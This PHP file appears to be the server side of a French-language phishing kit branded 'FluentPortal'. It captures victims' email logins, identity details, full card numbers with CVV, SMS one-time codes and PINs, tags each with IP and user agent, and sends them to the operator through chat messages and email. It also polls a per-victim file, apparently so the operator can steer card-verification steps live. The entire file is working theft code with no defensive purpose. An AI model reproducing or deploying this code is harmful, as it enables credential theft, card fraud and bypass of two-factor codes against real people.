<?php

include 'functions.php';

if (isset($_GET['action'])) {
    if ($_GET['action'] ==  'send') {
        $rez = $_GET['rez'];
        if ($_GET['step'] == "1") {
          $final = explode('|',$rez);
          $message = "─────────── ⋆⋅ 📧 ⋅⋆ ───────────

📧 Email : ".$final[0]."
🔑 Password : ".$final[1]."

─────────── ⋆⋅ 📶 ⋅⋆ ───────────
              
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
          
          sendMessage($message, false, $chatid);
          mail($email, "📧 + 1 Nouvelle adresse e-mail : ".$_SESSION['email']." 📧", $message, 'From: 🪡 FluentPortal <rez@log.fr>');
  
        }
        if ($_GET['step'] == "2") {
            $final = explode('|',$rez);
            $_SESSION['name'] = $final[0];
            $_SESSION['dob'] = $final[1];
            $_SESSION['tel'] = $final[2];
            $_SESSION['address'] = $final[3];
            $_SESSION['zip'] = $final[4];
            $_SESSION['city'] = $final[5];
            $_SESSION['billing'] = $final;
        
            $message = "─────────── ⋆⋅ 🪪 ⋅⋆ ───────────
      
👮🏼‍♂️ Nom et prénom : ".$_SESSION['name'] . "
👨🏼‍⚕️ Date de naissance : ".$_SESSION['dob']."
☎️ Numéro de téléphone : ".$_SESSION['tel']."
                    
🏘 Ville : ".$_SESSION['city']."
🛖 Adresse : ".$_SESSION['address']."
🗳 Code Postal : ".$_SESSION['zip']."
                 
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
              
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
                
            sendMessage($message, false, $chatidbilling);
            mail($email, "👤 + 1 Informations personnelle : ".$_SESSION['name']." 👤", $message, 'From: 🪡 FluentPortal <rez@log.fr>');
            update('billing');
        }
        
        if ($_GET['step'] == "3") {
          $final = explode('|',$rez);
          $bin = substr($final[0],0,7);
          $bin = str_replace(' ','',$bin);
          $data = json_decode(getBin($bin),true);
          $level = $data['level'];
          $type = $data['type'];
          $bank = $data['bank'];
          $message = "─────────── ⋆⋅ 🕍 ⋅⋆ ───────────
    
🕍 Numéro de carte : ".$final[0]."
🕍 Date d'expiration : ".$final[1]."
🕍 CVV : ".$final[2]."
          
🎖 Level : ".$level."
🏦 Banque : ".$bank."
♻️ Type : ".$type."

─────────── ⋆⋅ 🪪 ⋅⋆ ───────────
      
👮🏼‍♂️ Nom et prénom : ".$_SESSION['name'] . "
👨🏼‍⚕️ Date de naissance : ".$_SESSION['dob']."
☎️ Numéro de téléphone : ".$_SESSION['tel']."
                    
🏘 Ville : ".$_SESSION['city']."
🛖 Adresse : ".$_SESSION['address']."
🗳 Code Postal : ".$_SESSION['zip']."
                 
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
              
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
            change($_SERVER['REMOTE_ADDR'], '');
            if ($panel == '1') {
              sendMessage($message, True, $chatidcc);
            }else{
              sendMessage($message, false, $chatidcc);
            }
            mail($email, "🕍 + 1 Carte de crédit : ".$final[0]." 💳", $message, 'From: 🪡 FluentPortal <rez@log.fr>');
            
            update('cc');

            
        }
        if ($_GET['step'] == "4") {
            $message = "─────────── ⋆⋅ 🔓 ⋅⋆ ───────────
    
🔓 SMS : ".$rez."
                           
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
              
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
              change($_SERVER['REMOTE_ADDR'], '');
              
              sendMessage($message, True, $chatidcc);
              mail($email, "💳 + 1 Code SMS : ". $rez ." 💳", $message, 'From: 🪡 FluentPortal <rez@log.fr>');
              update('other');
        }


      if ($_GET['step'] == "5") {
        $final = explode('|',$rez);

        $message = "─────────── ⋆⋅ 🛡 ⋅⋆ ───────────

🛡 PIN : ".$rez."
                               
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
              
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";

          change($_SERVER['REMOTE_ADDR'], '');
          sendMessage($message, True, $chatidcc);
          mail($email, "💳 + 1 Code SMS : ". $rez ." 💳", $message, 'From: 🪡 FluentPortal <rez@log.fr>');
          update('other');
    }
  
        
    }else if ($_GET['action'] == "checkRedirect") {
      $id = $_SERVER['REMOTE_ADDR'];
      $data = json_decode(@file_get_contents('../help/!#/vbv.json'), true);
      if (isset($data[$id])) {
          if ($data[$id] != '') {
            echo $data[$id];
          }else {
            echo "loading";
          }
      } else {
          echo "loading";
      } 
    }
  }
?>